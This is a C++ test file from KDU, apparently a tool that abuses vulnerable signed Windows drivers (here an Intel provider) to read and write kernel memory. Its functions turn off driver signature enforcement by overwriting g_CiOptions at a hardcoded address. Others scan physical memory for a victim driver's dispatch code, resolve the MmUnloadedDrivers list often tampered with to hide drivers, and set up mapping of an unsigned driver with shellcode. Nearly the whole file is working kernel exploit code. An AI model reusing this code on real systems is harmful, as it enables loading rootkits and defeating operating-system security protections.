/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2024
*
*  TITLE:       TESTS.CPP
*
*  VERSION:     1.42
*
*  DATE:        01 Apr 2024
*
*  KDU tests.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

VOID KDUTestLoad()
{
    ULONG i;
    HINSTANCE hProv;
    PKDU_DB provLoadData;
    ULONG dataSize = 0;
    PVOID pvData;

    hProv = KDUProviderLoadDB();
    if (hProv == NULL)
        return;

    provLoadData = KDUReferenceLoadDB();
    if (provLoadData == NULL)
        return;

    for (i = 0; i < provLoadData->NumberOfEntries; i++) {

        pvData = KDULoadResource(provLoadData->Entries[i].ResourceId,
            hProv,
            &dataSize,
            PROVIDER_RES_KEY,
            TRUE);

        if (pvData) {
            printf_s("[+] Provider[%lu] loaded\r\n", provLoadData->Entries[i].ResourceId);
            supHeapFree(pvData);
        }
        else {
            printf_s("[+] Provider[%lu] failed to load\r\n", provLoadData->Entries[i].ResourceId);
        }


    }
}

VOID KDUTestDSE(PKDU_CONTEXT Context)
{
    ULONG_PTR g_CiOptions = 0xfffff80031e3a478;//need update
    ULONG_PTR oldValue = 0, newValue = 0x0, testValue = 0;
    KDU_PROVIDER* prov = Context->Provider;

    if (prov->Callbacks.ReadKernelVM) {
        prov->Callbacks.ReadKernelVM(Context->DeviceHandle, g_CiOptions, &oldValue, sizeof(oldValue));
        Beep(0, 0);
    } 

    if (prov->Callbacks.WriteKernelVM) {
        prov->Callbacks.WriteKernelVM(Context->DeviceHandle, g_CiOptions, &newValue, sizeof(newValue));
        Beep(0, 0);
    }
    
    if (prov->Callbacks.ReadKernelVM) {
        prov->Callbacks.ReadKernelVM(Context->DeviceHandle, g_CiOptions, &testValue, sizeof(testValue));

        if (testValue != newValue)
            Beep(1, 1);
    }

    if (prov->Callbacks.WriteKernelVM) {
        prov->Callbacks.WriteKernelVM(Context->DeviceHandle, g_CiOptions, &oldValue, sizeof(oldValue));
    }
}

BOOL WINAPI TestPhysMemEnumCallback(
    _In_ ULONG_PTR Address,
    _In_ PVOID UserContext)
{
   
    PKDU_PHYSMEM_ENUM_PARAMS Params = (PKDU_PHYSMEM_ENUM_PARAMS)UserContext;
   
    ULONG signatureSize = Params->DispatchSignatureLength;

    BYTE buffer[PAGE_SIZE];
    RtlSecureZeroMemory(&buffer, sizeof(buffer));

    if (Params->ReadPhysicalMemory(Params->DeviceHandle,
        Address,
        &buffer,
        PAGE_SIZE))
    {
        if (signatureSize == RtlCompareMemory(Params->DispatchSignature,
            RtlOffsetToPointer(buffer, Params->DispatchHandlerPageOffset),
            signatureSize))
        {
            printf_s("\t Found code at address 0x%llX\r\n", Address);
            Params->ccPagesFound += 1;
        }
    }

    return FALSE;
}

VOID TestBrute(PKDU_CONTEXT Context)
{
    KDU_PHYSMEM_ENUM_PARAMS params;
    VICTIM_IMAGE_INFORMATION vi;
    HANDLE victimDeviceHandle = NULL;

    if (Context->Provider->Callbacks.ReadPhysicalMemory == NULL)
        return;

    if (VpCreate(Context->Victim, Context->ModuleBase, &victimDeviceHandle, NULL, NULL)) {

        RtlSecureZeroMemory(&vi, sizeof(vi));
        VpQueryInformation(Context->Victim, VictimImageInformation, &vi, sizeof(vi));

        params.DeviceHandle = Context->DeviceHandle;
        params.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
        params.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;

        params.DispatchSignature = Context->Victim->Data.DispatchSignature;
        params.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;

        params.DispatchHandlerOffset = vi.DispatchOffset;
        params.DispatchHandlerPageOffset = vi.DispatchPageOffset;
        params.JmpAddress = vi.JumpValue;

        params.bWrite = FALSE;
        params.cbPayload = 0;
        params.pvPayload = NULL;
        params.ccPagesFound = 0;
        params.ccPagesModified = 0;

        if (supEnumeratePhysicalMemory(TestPhysMemEnumCallback, &params)) {

            printf_s("[+] Number of pages found: %llu\r\n", params.ccPagesFound);

        }
    }
}

VOID TestSymbols()
{
    if (symInit()) {

        supResolveMiPteBaseAddress(0);

        HMODULE hModule = LoadLibraryEx(NTOSKRNL_EXE, NULL, DONT_RESOLVE_DLL_REFERENCES);

        if (hModule) {

            ULONG_PTR ntosBase = supGetNtOsBase();

            if (symLoadImageSymbols(NTOSKRNL_EXE, (PVOID)hModule, 0)) {

                ULONG_PTR address = 0;

                ///MmUnloadedDrivers
                if (symLookupAddressBySymbol("MmUnloadedDrivers", &address)) {

                    printf_s("[X] symbol address %llX\r\n\tkm address %llX\r\n",
                        address,
                        (ULONG_PTR)ntosBase + address - (ULONG_PTR)hModule);
                }

            }

        }
    }
}

VOID KDUTest()
{
    PKDU_CONTEXT Context;

   // KDUTestLoad();

   // TestSymbols();
    Context = KDUProviderCreate(KDU_PROVIDER_INTEL_PMXDRV, 
        FALSE, 
        NT_WIN10_20H1, 
        KDU_SHELLCODE_V1, 
        ActionTypeMapDriver);

    if (Context) {

        //TestBrute(Context);
        KDUTestDSE(Context);

        KDUProviderRelease(Context);
    }
}
